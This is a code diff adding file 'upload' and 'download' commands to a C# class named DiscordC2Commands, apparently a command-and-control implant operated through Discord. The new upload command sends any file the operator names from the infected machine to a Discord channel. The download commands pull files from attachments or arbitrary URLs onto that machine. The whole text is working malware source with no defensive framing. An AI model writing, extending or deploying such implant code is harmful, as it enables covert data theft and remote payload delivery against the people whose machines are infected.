@@ -42,5 +42,35 @@ public class DiscordC2Commands : ModuleBase<ShardedCommandContext>
             await Context.Channel.SendMessageAsync($"```\n{output}\n```");
         }
     }
+
+    [Command("upload", RunMode = RunMode.Async)]
+    public async Task Upload(string path)
+    {
+        var filename = Environment.ExpandEnvironmentVariables(path);
+        if (File.Exists(filename))
+            await Context.Message.Channel.SendFileAsync(filename);
+        else
+            await Context.Message.Channel.SendMessageAsync("file not found");
+    }
+
+    [Command("download", RunMode = RunMode.Async)]
+    public async Task Download(string filename)
+    {
+        if (Context.Message.Attachments.Count == 0)
+        {
+            await Context.Message.Channel.SendMessageAsync("Attach a file or include a URL");
+            return;
+        }
+        string url = Context.Message.Attachments.First().Url;
+        await Context.Message.Channel.SendMessageAsync(Utils.DownloadFile(url, filename));
+    }
+    
+    [Command("download", RunMode = RunMode.Async)]
+    public async Task Download(string url, string filename)
+    {
+        await Context.Message.Channel.SendMessageAsync(Utils.DownloadFile(url, filename));
+    }
+
+
 }
 
